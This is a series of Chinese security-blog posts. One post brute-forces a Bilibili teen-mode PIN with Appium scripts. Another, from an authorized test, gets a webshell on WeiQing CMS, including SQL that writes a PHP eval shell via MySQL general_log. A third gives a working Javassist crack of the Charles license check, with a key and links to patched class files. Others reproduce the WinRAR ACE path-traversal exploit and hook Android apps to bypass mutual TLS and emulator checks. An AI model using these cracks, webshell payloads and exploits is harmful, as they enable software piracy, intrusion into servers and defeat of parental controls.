安装后执行appium-doctor --ios指令，可以查看与iOS相关配置是否完整。 如果有哪一项是打叉的，则根据安装说明进行安装就可以了。 下图是全部配置都成功的情况。 由于需要在真机下进行测试所以还需要配置WebDriverAgent。 配置WebDriverAgent下载WebDriverAgent。 进入到WebDriverAgent目录，然后执行./Scripts/bootstrap.sh下载安装依赖库。 双击WebDriverAgent.xcodeproj使用xcode打开WebDriverAgent项目 配置WebDriverAgentLib、WebDriverAgentRunner以及IntegrationApp的开发者信息 发现有错误，接下来修改WebDriverAgentRunner和IntegrationApp的Bundle identifier。 修改后发现无报错信息。然后数据线连接真机，进行安装。 发现编译失败，将 assign 改成 unsafe_unretained ，然后重新使用command + u进行编译安装测试。 然后访问http://手机IP:8100。如http://172.20.10.1:8100/status 。 需要手机与电脑处于同一网络下，我这里为了测试，电脑连接的是手机的热点。 此时WebDriverAgent配置成功。如果在Appium中使用时，还需替换Appium中的WebDriverAgent。 我这里的路径为/Applications/Appium.app/Contents/Resources/app/node_modules/appium/node_modules/appium-xcuitest-driver/node_modules/WebDriverAgent 直接替换即可，或者直接修改Appium中的WebDriverAgent，效果一样。 接下来就是自动化脚本的编写。 自动化脚本编写可以通过使用Appium应用程序查看IOS元素特征。启动Appium，左上角菜单栏选择APPium-New Session Window...(或者快捷键command+N)。 填写对应的启动参数。 一些必要的参数： platformName是测试平台的名称，是ios或者Android。 udid在ios真机测试时需要，可以通过ios-deploy --list_bundle_id查询 bundleId需测试程序的bundle id,可以通过ios-deploy --list_bundle_id查询 配置完成后，点击Start Session，手机会自动打开哔哩哔哩APP。 可以利用xpath获取元素并进行输入、点击等一系列操作。接下来就可以通过使用Python脚本来进行自动化测试了。 需要安装appium的python依赖库。 1pip install Appium-Python-Client 启动APP的脚本如下： 1234567891011121314151617from appium import webdriver #pip install Appium-Python-Clientimport timedef main(): desired_caps = dict() desired_caps['platformName'] = 'iOS' desired_caps['platformVersion'] = '13.5.1' desired_caps['deviceName'] = 'xiamo6' desired_caps['automationName'] = 'XCUITest' desired_caps['udid'] = '8d4************a3' desired_caps['bundleId'] = 'tv.danmaku.bilianime' driver = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) time.sleep(5) driver.quit()if __name__ == '__main__': main() 运行效果如下： 接下来需要进入到输入密码界面，依次需要点击我的-青少年模式-修改密码（或者关闭青少年模式）。 利用脚本实现就是： 123driver.find_element_by_id(\"我的\").click()driver.find_element_by_xpath(\"//XCUIElementTypeStaticText[@name=\\\"青少年模式\\\"]\").click()driver.find_element_by_id(\"关闭青少年模式\").click() 运行效果如下 如果是已经打开app 40分钟，或者非正常时段，则直接显示的是输入密码界面。 可以利用xpath获取密码输入框元素，输入密码后并点击“立即验证”按钮，主要代码如下： 12345driver.set_value(driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[1]\"),pwd[0])driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[2]\").send_keys(pwd[1])driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[3]\").send_keys(pwd[2])driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[4]\").send_keys(pwd[3])driver.find_element_by_xpath(\"//XCUIElementTypeButton[@name=\\\"立即验证\\\"]\").click() 完整的代码如下： 1234567891011121314151617181920212223242526272829from appium import webdriver #pip install Appium-Python-Clientimport timedef main(): desired_caps = dict() desired_caps['platformName'] = 'iOS' desired_caps['platformVersion'] = '13.5.1' desired_caps['deviceName'] = 'xiamo6' desired_caps['automationName'] = 'XCUITest' desired_caps['udid'] = '8d4904454b********552e976a3' desired_caps['bundleId'] = 'tv.danmaku.bilianime' driver = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) for p in range(5091,10000): try: pwd = str(p) driver.set_value(driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[1]\"),pwd[0]) driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[2]\").send_keys(pwd[1]) driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[3]\").send_keys(pwd[2]) driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[4]\").send_keys(pwd[3]) driver.find_element_by_xpath(\"//XCUIElementTypeButton[@name=\\\"立即验证\\\"]\").click() print(pwd,'error') except Exception: print(pwd,'is right') break driver.quit()if __name__ == '__main__': main() 运行效果 由上面执行的结果来看，每次输入前都会等待一会再输入，所以看起来速度很慢。 通过找到上图标记的XCUIElementTypeOther，然后使用Send Keys直接传入一个四位数字。 12driver.find_element_by_xpath(\"//*/XCUIElementTypeWindow[1]/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther\").send_keys(pwd)driver.find_element_by_xpath(\"//XCUIElementTypeButton[@name=\\\"下一步\\\"]\").click() 执行结果如图所示。 这里的动图是4倍速播放。 修改过后，发现速度确实有所提升，但是总体速度还是很慢的。经过搜索发现，有帖子说在IOS模拟器上和安卓上会快一些，由于程序无法安装到IOS模拟器，所以这里选择了在安卓设备上进行测试。 安卓环境下测试安卓的环境需要安装Android SDK、JDK、安卓模拟器(真机也可以，这里采用的是Genymotion模拟器)。安装后配置JAVA_HOME、ANDROID_HOME。 然后通过执行appium-doctor --android来查看是否配置成功，如图所示。 查看android元素信息可以使用uiautomatorviewer。位于Android SDK下的/tools/bin/目录。 启动模拟器并打开测试的APP，然后打开uiautomatorviewer。选择Device Screenshot（从左至右第二个图标）。 通过tv.danmaku.bili:id/et_code可以定位到编辑框，按钮“立即验证”可以通过tv.danmaku.bili:id/operate来定位。 这里直接贴使用安卓下自动化爆破的脚本，代码如下： 12345678910111213141516171819202122232425262728from appium import webdriverimport timedef main(): desired_caps = dict() desired_caps['platformName'] = 'Android' desired_caps['platformVersion'] = '6.0' desired_caps['deviceName'] = 'Nexus' desired_caps['appPackage'] = 'tv.danmaku.bili' desired_caps['appActivity'] = 'ui.splash.SplashActivity' desired_caps['noReset'] = True desired_caps['automationName'] = 'UiAutomator2' driver = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) for pwd in range(4011,10000): try: driver.find_element_by_id('tv.danmaku.bili:id/et_code').send_keys(pwd) driver.find_element_by_id(\"tv.danmaku.bili:id/operate\").click() print(pwd,'error') except Exception: print(pwd,'is right') break time.sleep(4) driver.quit()if __name__ == '__main__': main() 运行效果如图所示 对比之下，在Android下的效率是很快的。而且经过测试，安卓破解100次，耗时约139.14s，而ios破解50次，耗时约262.56s。 所以最后我采用了安卓环境下进行破解，最终成功跑出了密码。 已经成功找到密码4578。 0x03 思考由于输入密码的时候并没有发生网络请求，猜测密码应该保存在本地。一般情况下本地存储采用sqlite数据库或者是SharePreferences中。 先查看SharePreferences中的文件，进入/data/data/tv.danmaku.bili/shared_prefs目录。 发现文件bili_teenagers_mode_preferences20449166.xml，根据文件名发现文件就是和青少年模式有关的配置文件。查看里面的内容 发现一串神秘字符串，通过cmd5查询：c2890d44d06bafb6c7b4aa194857ccbc=md5(4578)。正好是设置的密码。 另外由于登录前可以看到所有的内容，而登录开启青少年模式的账户时，就会进入青少年模式，只能看特定内容。所以退出账户重新登录并抓包，可以看到如下的请求。 也成功找到经过md5加密的密码。 0x04 总结这次是因为B站开启了青少年模式，后来密码给忘记了。当时只想着用爆破的方式来解决了，没有想着抓包或者查看保存的数据文件。后来爆破出密码后，又发现可以通过查看配置文件的方式和抓包的方式找到密码。而且之前是打算用ios作为测试的，后来因为效率的问题，才转战安卓。如果使用安卓的话，自动化测试工具也很多，例如UIAutomator2等。 本文其实就是一个流水账，记录一下自己找回青少年模式密码的过程，可能比较粗糙。有关IOS真机调试更详细的教程可以参考使用Appium进行iOS的真机自动化测试 。","tags":"appium 自动化测试 青少年模式"},{"title":"记一次从源代码泄漏到后台获取webshell的过程","url":"/2020/04/18/WeiQing-CMS-Background-Admin-GetShell/","text":"0x01 前言在一次授权测试中对某网站进行测试时，marry大佬发现了一个网站的备份文件，里面有网站源代码和数据库备份等。根据网站信息和代码都可以发现该系统采用的是微擎cms，利用数据库备份中的用户信息解密后可以登录系统，接下来要看是否可以获取webshell。 0x02 WEBSHELL获取的尝试有了数据库备份文件，然后找一下是否有用户的信息，能否登录系统。 1.登录后台解压备份文件可以从data/backup目录下找到数据库的备份，从中找到了用户表ims_users。 知道了用户名、加密后的密码和salt，我们去看一下密码加密的算法。 我这里直接搜索password，在forget.ctrl.php中找到了一处。 密码加密方法是$password = md5($password . $member_info[&#39;salt&#39;] . $_W[&#39;config&#39;][&#39;setting&#39;][&#39;authkey&#39;]);。是根据原密码+salt+authkey的形式进行拼接，然后进行md5加密。 authkey在data/config.php文件中。 现在salt和authkey以及加密后的密码已经获得，开始去解密密码是多少。这里我们将salt和authkey拼接为新的salt，然后使用md5($pass.$salt)的加密方式进行解密。 解密后即可登录后台。 接下来就是webshell的获取了。 本以为都已经是管理员了，获取shell就是分分钟的事，然而事情远远没有那么简单。 2.失败的获取shell过程根据搜索发现，该cms后台获取shell的方法也不少，主要还是围绕执行sql这里。但我这里都失败了，就简单的提一下。 第一种方法： 站点管理-附件设置-图片附件设置-支持文件后缀，任意添加一个类型，例如添加pppppp。 然后执行sql语句 1UPDATE ims_core_settings SET value = replace(value, 'pppppp', 'php ') 更新缓存，之后就可以上传&quot;*.php &quot;文件了。但是有限制，适用于apache下，而且版本有限制。目标站不使用该方法的原因有二，一是该系统上传的位置是腾讯云COS上，二是server是Tengine。 第二种方法： 第二种方法也是和sql执行有关，利用日志文件写shell。 1234show variables like '%general%'; #查看配置set global general_log = on; #开启general log模式set global general_log_file = '/var/www/html/1.php'; #设置日志目录为shell地址select '&lt;?php eval($_POST[cmd]);?&gt;' #写入shell 或者通过慢查询（slow_query_log）的方法写shell。但目标系统也是失败，执行sql的时候报错。 还有一些其他的方法，这里测试也是失败的，就不再列举了。 0x03 代码审计病急乱投医，熬成老中医。既然之前的方法不管用，只好去翻代码吧，找找是否有新的利用方式。翻出之前的一个文档，从里面找到之前的审计过程，看能否对现在有用。结果打开发现只有一个数据包和还有一句未实现的结论。 没办法，只好重新围着这个点继续审计，看是否能有所进展。 1.分析打开文件web/source/cloud/dock.ctrl.php，找到执行的download方法。 代码比较简单，我大概说一下这里的流程： 如果请求包非Base64加密的格式，那么$data就是请求包的内容。然后对$data进行发序列化返回$ret，接下来获取$ret[&#39;file&#39;]并Base64解密返回$file。当存在gzcompress和gzuncompress这两个函数时，就会利用gzuncompress函数对$file进行解压操作。 将获取的$file进行md5加密后，与$ret[&#39;path&#39;]以及获取的$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]进行拼接为$string。当满足$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]非空并且$stringmd5加密后的结果与$ret[&#39;sign&#39;]一致时，才可以进行下面的操作。下面就是文件的写入了，根据$ret[&#39;path&#39;]进行判断，然后写入的位置不一样。 这里关键的一点就是$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]这个值的获取。这个是利用authcode函数对cache_load(cache_system_key(&#39;cloud_transtoken&#39;))进行解密获取的。 authcode函数位于framework/function/global.func.php文件中。 由上面代码可以看出，要想使用authcode加解密，需要知道$GLOBALS[&#39;_W&#39;][&#39;config&#39;][&#39;setting&#39;][&#39;authkey&#39;]，在上面提到过，authkey在data/config.php文件中。 那么如果想任意写文件，就需要知道cache_system_key(&#39;cloud_transtoken&#39;)的内容了。 2.cloud_transtoken的获取通过搜索发现，这个值是在文件framework/model/cloud.mod.php中的cloud_build_transtoken函数中被写入的，通过进入cache_write方法，发现会写入数据库中。 既然会写入到数据库中，而且目标系统下载到时候有数据库的备份文件，我们直接在数据库备份文件中搜索cloud_transtoken。结果并没有找到，可能原因是没有写入cloud_transtoken的时候就进行了数据库备份。 我们往上回溯，看哪里调用了cloud_build_transtoken。 发现了其中的一条利用链： 当访问http://ip:port/web/index.php?c=cloud&amp;a=profile 时，就会判断站点ID和通信密钥是否为空（即站点是否注册），如果站点注册了，就会调用cloud_site_info()函数获取站点信息。函数cloud_site_info()调用了cloud_api(&#39;site/info&#39;)，这里的method为site/info，所以继续调用cloud_build_transtoken从会而将cloud_transtoken的内容写入数据库。然后通过数据库备份的功能，就可以看到数据库中保存的cloud_transtoken，进而可以利用之前的分析写shell。 3.自定义数据库备份由于数据库备份需要关闭站点，为了不影响目标站点的使用，这里我们搭建一个环境演示一下过程（需要注册站点）。 登录成功后更新缓存，然后访问http://ip:port/web/index.php?c=cloud&amp;a=profile ，关闭站点后进行数据库备份。 发现可以获取cloud_transtoken，但是数据库目录和文件的名字是随机的。 而且如果备份文件里面的数据库文件不是最新的，那么即使获取到cloud_transtoken也无法利用，我们需要最新的备份文件。 然后我们看一下数据库备份是怎么实现的，打开web/source/system/database.ctrl.php。 发现文件夹和分卷名可以自定义，如果为空或不满足条件的话，文件夹是时间戳、下划线和8位随机字符串的拼接，分卷名是volume-10位随机字符串-1.sql的形式，既然可以自定义，那么就简单多了。 访问链接http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456 进行数据库备份，则数据库备份文件的地址为：http://ip:port/data/backup/123/volume-456-1.sql 然后就可以随时获取cloud_transtoken了。接下来就可以进行shell的获取了。 4.获取WEBSHELL根据上面的分析，cloud_transtoken、authkey已经知道了，接下来就是构造payload了。 然后请求http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download ，data为生成的payload。 可以进行任意文件的写入，对目标系统进行测试，也成功获取了shell。 5.延伸上面是因为有系统文件备份，然后获取/data/config.php中的authkey。如果没有文件备份，登录了一个管理员权限的用户，能否获取shell呢。答案也是可以的。 该系统有一个木马查杀功能，可以根据这个功能读取文件内容。 选择一个目录，然后提交并拦截数据库包，修改查杀目录为data/.，特征函数为password。然后就可以看到查杀结果，获取authkey的值。 在对最新版 v2.5.7（202002140001）进行木马查杀的时候，可以从查杀报告中看到该文件，但是查看时提示文件不存在。原因是最新版利用正则对文件路径进行匹配，如果匹配成功就提示文件不存在（windows下可以利用大写路径绕过）。 0x04 总结根据上面对分析过程，该漏洞的利用过程如下： 1.成功登录后台，且拥有管理员权限。 2.更新缓存（非必须），访问链接http://ip:port/web/index.php?c=cloud&amp;a=profile 写入cloud_transtoken到数据库中。 3.关闭站点并进行使用自定义的目录进行数据库备份，链接地址：http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456 。然后下载数据库备份，地址为：http://ip:port/data/backup/123/volume-456-1.sql （多个分卷的话文件名为volume-456-2.sql、volume-456-3.sql… ）,然后找到cloud_transtoken。 4.生成payload，请求http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download ，写入shell。 总的来说，利用上述方法获取shell需要满足两个条件，第一是拥有一个管理员权限的用户，第二就是该站点注册了云服务。","tags":"微擎 代码审计"},{"title":"Charles的一次破解之旅","url":"/2019/10/25/charles-crack/","text":"0x01 前言本文以WEB抓包工具Charles(v4.2.8)为例，讲解一下其注册的流程以及如何使用javassist对java软件进行修改，达到破解的目的。 先看一下实现的效果。使用任意用户名+任意key就可以进行激活。 激活成功 如果想换用户名，取消注册再次注册即可。 Help-&gt;Unregister Charles… 接下来我们来分析一下注册的流程，以及如何去破解。 0x02 分析首先打开软件(版本为v4.2.8)，未注册时需要等待10s的动画才可进入，而且30分钟后会退出软件。 打开Help-&gt;Register Charles…，看到注册界面。 使用jadx-gui打开charles.jar，搜索字符串Register Charles，定位到com.xk72.charles.gui.frames.RegisterFrame中。 其中一段代码： 1this.bRegister.addActionListener(new NBdE(this)); 可以看到注册按钮绑定的事件，当按下注册按钮时，执行new NBdE(this)。 跟进到com.xk72.charles.gui.frames.NBdE 其中的trim为Registered Name，trim2为License Key 首先对输入的name和key进行判断，需要其长度要大于0，然后调用qHTb.DdNM(trim, trim2)方法，并对其返回的结果进行判断。当不为null时，注册失败。反之则注册成功。 跟进com.xk72.charles.qHTb中，调用的是DdNM(String str1,String str2) 由之前的推断可以知道，当qHTb.DdNM(str1, str2)=null时注册成功，这里DdNM(String str1,String str2)函数中如果正常执行twLa = new qHTb(str, str2);则会返回null，否则返回异常的信息。所以需要看twLa = new qHTb(str, str2);是否抛出异常，如果未异常，则返回为null，即注册成功；反之，注册失败。 继续跟进构造函数qHTb(String str1,String str2)。 构造函数qHTb(String str1,String str2)调用了qHTb(String str1,String str2,int i) 其主要代码如下： 123456789101112131415161718192021private qHTb(String str, String str2, int i) &#123; boolean z = false; this.gbef = false;//表示是否注册成功 true为成功 this.lPpR = \"Unregistered\";//注册成功后为输入的Registered Name try &#123; String replaceAll = str.replaceAll(\"[ ᠎ ]\", \" \");//替换特殊字符 if (DdNM(twLa(replaceAll, str2, 4))) &#123; z = true; &#125; else if (!replaceAll.equals(str)) &#123; z = DdNM(twLa(str, str2, 4)); &#125; if (!z) &#123; throw new LicenseException(DdNM(2)); &#125; this.lPpR = str;//注册成功，lPpR为Registered Name this.gbef = true;//注册成功 &#125; catch (NumberFormatException e) &#123; throw new LicenseException(DdNM(1)); &#125; &#125; 因此要使注册成功，首先需要twLa(String str,String str2, int i)在调用的时候无异常，并且需要DdNM(long j)返回为true。 由以上代码可知，当j=lGuB时，返回为true。lGuB为已知常量。即需要满足j=5911726755176091652L;时，DdNM(long j)返回为true。 接下来看twLa(String str,String str2, int i)。 由于jadx-gui查看twLa未反编译完全，为了查看方便，这里用Idea打开。 twLa方法的三个参数，var1是注册的name，var2是注册的key，var3是4. 分割线以上的为注册码的校验，下面为对用户名进行操作。可以从以上的代码看出，在用户名操作时没有抛出异常的行为，所以从这里来看，注册成功与否与用户名没有直接关系（因为从之前的推断可知，当出现异常时注册失败）。 所以这里的破解思路是： 使用javassist修改twLa(String str,String str2, int i)中的第二个参数，为一个可用的注册码，然后使该函数的返回值为5911726755176091652L即可。 当然也可以直接修改DdNM(long j)返回为true，修改DdNM(String str1, String str2)第二个参数为可用的key。这样修改以后，在软件运行注册的时候，可以达到任意用户名和任意key注册的效果。 当然修改的方法不止这两种，知道注册流程后，修改就很容易了。 接下来引入如何使用javassist来对软件进行修改。 0x03 使用javassist进行修改Javassist是一个开源的分析、编辑和创建Java字节码的类库。虽然关于java字节码的处理有很多工具，如bcel，asm。不过这些都需要直接跟虚拟机指令打交道。而且Javassit 提供了更高级的API，无需掌握字节码指令的知识，对使用者要求较低。直接使用java编码的形式，不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。 v4.2.8的修改根据上面的分析，修改v4.2.8时，需要修改DdNM(long j)返回为true，修改DdNM(String str1, String str2)第二个参数为可用的key，例如C9D1226DB5B93C12D1。 利用Javassist进行修改起来也很简单，具体实现代码如下： 1234567891011121314private static ClassPool pool = ClassPool.getDefault(); public static void main(String[] args) throws Exception &#123; pool.insertClassPath(\"~/Desktop/charles.jar\"); CtClass ctClass = pool.get(\"com.xk72.charles.qHTb\"); CtMethod ctm1 = ctClass.getDeclaredMethod(\"DdNM\",new CtClass[]&#123;pool.get(\"long\")&#125;); ctm1.setBody(\"return true;\");//修改返回值 CtMethod ctm2 = ctClass.getDeclaredMethod(\"DdNM\",new CtClass[]&#123;pool.get(\"java.lang.String\"),pool.get(\"java.lang.String\")&#125;); ctm2.insertBefore(\"$2=\\\"C9D1226DB5B93C12D1\\\";\");//修改第二个参数 ctClass.writeFile(\"~/Desktop/\"); &#125; 然后更新修改的内容，并替换 123jar -uvf charles.jar comcp charles.jar /Applications/Charles.app/Contents/Java/ 然后再次打开Charles注册时就可以达到文章开头的效果了。 更改后的文件：https://fuping.site/files/qHTb.class 使用方法：新建文件夹com/xk72/charles，然后将class文件放入其中，执行jar -uvf charles.jar com。再替换charles.jar即可。 v4.5.4的修改当时修改的时候最新版是v4.2.8，10.29号下载的是v4.5.1，还没来得及安装，再次查看最新版已经是v4.5.4了。 虽然更新了，其中类名和方法名改变了，但是注册的流程还是老样子。根据上面的思路可以进行修改。找到注册校验的类。 需要修改的类为com.xk72.charles.DIWy。 需要修改的方法： 1.private boolean OZtq(long var1)，返回值修改为true。 2.public static String OZtq(String var0, String var1)，第二个参数为可用的key。 修改的代码就不贴了，和上面的一样，修改一下类名和方法名即可。 打开Charles后任意用户名+任意注册码注册成功。 更改后的文件：https://fuping.site/files/DIWy.class 0x04 总结关于Charles破解的文章，网上有很多。大多数都是直接修改了注册的标志和注册的信息，本文也是提供了另外一种破解的思路。通过简单分析注册的流程，然后使用javassist进行java文件的修改，以此达到破解的目的。 关于更多Charles破解相关的文章，可以参考以下几篇： [1].http://scz.617.cn:8/misc/201910241714.txt （有详细注册码的算法以及注册机） [2].http://www.520monkey.com/archives/1295 （有分析和修改） [3].https://www.freebuf.com/sectool/205520.html （有详细的javassist使用） …","tags":"charles破解 软件破解 javassist"},{"title":"WinRAR漏洞复现过程","url":"/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/","text":"0x01 漏洞描述近日Check Point团队爆出了一个关于WinRAR存在19年的漏洞，用它来可以获得受害者计算机的控制。攻击者只需利用此漏洞构造恶意的压缩文件，当受害者使用WinRAR解压该恶意文件时便会触发漏洞。 该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。 0x02 漏洞影响影响软件： WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 等等… 0x03 漏洞复现该漏洞的实现过程：首先新建一个任意文件，然后利用WinACE进行压缩，修改filename来实现目录穿越漏洞，可以将文件解压到任意目录中。 主要所需工具WinACE、010Editor。 下载WinACE并安装，安装完成后新建一个文本文件，名字任意。 然后利用WinACE进行压缩。 然后我们下载acefile.py脚本。 使用命令python acefile.py --headers liehu.ace来读取该文件头信息。 根据漏洞的描述，问题是出现在filename中的。那主要就看下面的header吧。 用010Editor打开该文件。 需要看选中的部分。对比acefile解析的结果，并明白各个段对应的内容。 如果要修改filename，则需要修改上面标注这几处。第一处为0x4e9a(hdr_crc),第二处为0x0044(hdr_size)，第三处为0x0025(filename的长度），以及最后一处为filename。 修改顺序是由后到前。 这里修改filename为d:\\d:\\liehu.txt 长度为15，对应的hex为0x000f 然后修改hdr_size，长度为46，对应的hex为0x002E。 接下来就是修改hdr_crc了，这里有一个取巧的方法。 我们再次运行命令python acefile.py --headers liehu.ace 程序中断并提示CorruptedArchiveError: header CRC failed 定位到错误的位置 这里ace_crc16(buf)的值就是ace文件0x4e9a对应的值，直接打印出该值并将该位置的值修改即可。 对应的值为63232，转换为hex为0xF700。 最后文件内容为 再次查看，可以正常解析，并看到filename已经修改成功 右键解压该文件，则会在D盘生成一个liehu.txt文件。 测试文件： https://fuping.site/files/liehu.ace 解压后会在D盘生成一个liehu.txt文件 测试脚本： https://github.com/fupinglee/MyPython/blob/master/exploit/WinRAR_exploit/WinRAR_exploit.py 0x04 修复建议有两种方式 升级到最新版本，WinRAR 目前版本是 5.70 Beta 1 删除UNACEV2.dll文件 此时再次解压恶意文件会提示如下错误： 0x05 参考https://research.checkpoint.com/extracting-code-execution-from-winrar/","tags":"winrar漏洞"},{"title":"安卓APP测试之双向证书认证","url":"/2019/02/13/SoulAPP-SSL-Bypass/","text":"0x01 前言在《安卓APP测试之HOOK大法-Frida篇》文章中有一个双向证书认证没详细说明，经过孔已己的提示，现在补充一下。 0x02 双向证书认证与解决方法在对soulApp进行抓包的时候，提示网络错误,请检查网络后重试~ 本来以为直接把这个okhttp的证书hook修改成系统默认的即可，就没有详细说明这一部分，结果有网友问双向证书认证这部分是如何处理的，就详细来说明一下如何处理。这里时由于采用了双向证书认证的缘故，所以抓包返回400错误，直接浏览器访问https://account.soulapp.cn/ ，也是不行的 提示No required SSL certificate was sent.如果要访问成功，就要带上证书。 关于双向证书认证：客户端有自己的密匙，并持有服务端的证书，服务端给客户端发送数据时，需要将服务端的证书发给客户端验证，验证通过才运行发送数据，同样，客户端请求服务器数据时，也需要将自己的证书发给服务端验证，通过才允许执行请求。详细的内容可以参考https://blog.csdn.net/enweitech/article/details/53813183。 我们本地来测试一下，简单介绍一下如何搭建双向证书认证环境。 1.双向证书认证服务器的搭建创建一个证书的步骤： （1）生成系统私钥 （2）生成待签名证书 （3）生成x509证书, 用CA私钥进行签名 证书的生成过程略。 以tomcat服务器为例。将生成的服务端证书server.p12和客户端信任证书truststore.jks放入conf目录下。修改tomcat下conf/server.xml文件，去掉https的注释。 123&lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11Protocol&quot; maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot; scheme&#x3D;&quot;https&quot; secure&#x3D;&quot;true&quot; clientAuth&#x3D;&quot;false&quot; sslProtocol&#x3D;&quot;TLS&quot; &#x2F;&gt; 修改为 12345&lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11Protocol&quot; truststoreFile&#x3D;&quot;conf&#x2F;truststore.jks&quot; truststorePass&#x3D;&quot;123456&quot; truststoreType&#x3D;&quot;JKS&quot; keystoreFile&#x3D;&quot;conf&#x2F;server.p12&quot; keystorePass&#x3D;&quot;123456&quot; keystoreType&#x3D;&quot;PKCS12&quot; maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot; scheme&#x3D;&quot;https&quot; secure&#x3D;&quot;true&quot; clientAuth&#x3D;&quot;false&quot; sslProtocol&#x3D;&quot;TLS&quot; &#x2F;&gt; 此时clientAuth=&quot;false&quot;，未开启客户端校验。 启动服务器并访问。 虽然提示错误但是点继续前往即可访问。 设置开启客户端校验，即clientAuth=&quot;true&quot; 然后重启后访问 无法正常访问，想要正常访问，浏览器导入证书即可 下一步然后输入密码 刷新页面，提示选择证书。 确定后即可访问。 2.soulAPP双向认证解决方法同理这里soulApp也可以这样做。 这里列举三种方法来完成客户端的验证。归根结底都是证书的利用。 a)浏览器导入证书利用soulApp中的证书和密码生成浏览器证书。 1openssl pkcs12 -export -inkey client.key -in client.crt -out soulclient.pfx 证书的位置位于资源文件assets中。 标记的1处输入的是soul证书的密码，2和3为证书导入浏览器自己设置的密码，这里为123456 然后导入浏览器，重新访问https://account.soulapp.cn/ 选择证书后确定。 根据页面显示内容可以发现此时导入证书后可以正常访问。 b)利用程序完成认证利用程序的话，参考cn.soulapp.android.api.e.a()方法，进行证书的操作。 精简之后主要代码如下： 然后利用httpclient进行http请求。 当访问不加证书的效果： 使用证书的结果： 由于这是这是之前的数据包，所以已经过期，再次使用需要更换时间戳和签名，但结果成功的。 c)利用抓包工具使用抓包工具，这里以burp为例。 未导入证书抓包结果： 提示400错误，我们在burp中导入证书 选择证书并输入密码。 证书导入成功。 再次抓包 已经可以正常抓取了。 当然使用其他方法也是可行的，这里就不再列举了。 0x03 总结本文主要是为了解决APP与服务器之间的双向证书认证问题，没有太多的技巧，主要就是证书的使用。如果服务器采用了双向认证，那么一般在APP中有证书和证书密码的存在，找到之后导入抓包工具即可。","tags":"soulapp 双向证书"},{"title":"安卓APP测试之HOOK大法-Xposed篇","url":"/2019/01/28/Xposed-Hook-SoulApp/","text":"0x01 前言安卓APP测试之HOOK大法-Frida篇是基于Frida来实现HOOK，对于部分用户来说，一方面手机ROOT会带来一些风险，另一方面虽然愿意承担风险但是手机无法ROOT。这就需要采用另外一种方法–利用Xposed来进行HOOK。安装VirtualXposed之后，并不需要对手机进行ROOT，也可以来运行Xposed模块进行HOOK。 VirtualXposed是基于VirtualApp 和 epic 在非ROOT环境下运行Xposed模块的实现（支持5.0~9.0)，就像它的介绍那样，Use Xposed with a simple APP, without needing to root, unlock the bootloader, or flash a system image.可以运行Xposed，不需要root，也不需要BL解锁和刷机。 0x02 环境准备手机还是采用魅族Mx4，关闭ROOT权限。 下载并安装VirtualXposed，下载地址：https://github.com/android-hacker/VirtualXposed/releases 安装： adb install VirtualXposed_0.16.1.apk 安装VirtualXposed之后，然后把手机上的APP安装到VirtualXposed上。 由于VirtualXposed自带Xposed，这里我们只将需要的APP安装上去即可。 开发Xposed模块采用的是Android Studio。 新建一个APP项目，添加依赖 12provided &#39;de.robv.android.xposed:api:82&#39;provided &#39;de.robv.android.xposed:api:82:sources&#39; 新建一个Main类，并实现IXposedHookLoadPackage接口。 在src/main下新建一个Assets Folder。 并在其中新建一个名称为xposed_init的文件，内容是实现HOOK的类，这里是com.fuping.soulhook.Main。 在AndroidManifest.xml中指定模块的名称 环境准备好了，下面就是模块的开发和HOOK了。 0x03 利用Xposed进行HOOK由于上篇文章已经分析过了，这里就不进行分析了，打开app会提示SoulApp 暂不支持模拟器，请稍后再试~。我们需要对cn.soulapp.android.utils.j.e()进行HOOK，令其返回为false。 上面模块的框架已经搭好了，直接写HOOK代码，主要代码如下： 注意，利用Android Studio进行模块的编写时，需要禁用Instant Run(File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Instant Run)。 然后打包安装。再利用VirtualXposed将编写的HOOK模块添加到VirtualXposed中。 查看安装的app 然后在VirtualXposed中打开Xposed Installer，在模块中勾选soulHook。 重启VirtualXposed。 Xposed模块每次修改都需要重启手机，在VirtualXposed中时，只需重启VirtualXposed即可，而且速度极快。 在VirtualXposed中打开soulapp，并查看logcat输出内容。 APP可以正常进入，说明HOOK成功。 剩下的也比较简单了，例如查看com.gongjiao.rr.tools.f.b参数。 主要代码： 运行输入手机号查看Log信息： 也是毫无问题可以获取到参数的内容的。 